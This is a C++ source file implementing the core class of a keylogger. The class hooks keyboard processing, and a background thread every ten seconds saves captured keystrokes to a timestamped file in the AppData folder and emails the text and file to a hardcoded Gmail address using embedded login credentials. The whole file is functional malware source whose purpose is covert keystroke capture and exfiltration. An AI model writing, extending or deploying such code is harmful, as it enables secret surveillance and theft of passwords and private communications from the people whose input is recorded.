#include "Keylogger.h"

#include "KeyloggerDirectoryLocator.h"

namespace keylogger
{
Keylogger::Keylogger(std::unique_ptr<mail::MailSender> mailSenderInit,
                     std::unique_ptr<KeyboardProcessor> keyboardProcessorInit,
                     std::unique_ptr<UserInputFileLogger> userInputFileLoggerInit)
    : mailThread{&Keylogger::sendMailContinuously, this},
      mailSender{std::move(mailSenderInit)},
      keyboardProcessor{std::move(keyboardProcessorInit)},
      userInputFileLogger{std::move(userInputFileLoggerInit)}
{
}

Keylogger::~Keylogger()
{
    if (mailThread.joinable())
    {
        mailThread.join();
    }
}

[[noreturn]] void Keylogger::sendMailContinuously()
{
    while (true)
    {
        std::this_thread::sleep_for(std::chrono::seconds(10s));
        auto currentKeyboardInput = KeyboardInput::getInput();

        if (KeyboardInput::isEmpty())
        {
            continue;
        }

        std::string lastFile =
            userInputFileLogger->writeLogToNewlyCreatedFileBasedOnCurrentTime(currentKeyboardInput);

        if (lastFile.empty())
        {
            continue;
        }

        keylogger::mail::Mail mail{"michalovskyyy@gmail.com", "michalovskyyy@gmail.com", "[" + lastFile + "]",
                                   "Logs from user: " + currentKeyboardInput,
                                   KeyloggerDirectoryLocator::getAppDataKeyloggerPath(true) + lastFile};
        keylogger::mail::Credentials credentials{"michalovskyyy@gmail.com", "xxx"};

        if (mailSender->sendMail(mail, credentials))
        {
            KeyboardInput::clearInput();
        }
    }
}

void Keylogger::installHook()
{
    keyboardProcessor->hookKeyboardProcessing();
}

void Keylogger::uninstallHook()
{
    keyboardProcessor->unhookKeyboardProcessing();
    mailThread.join();
}
}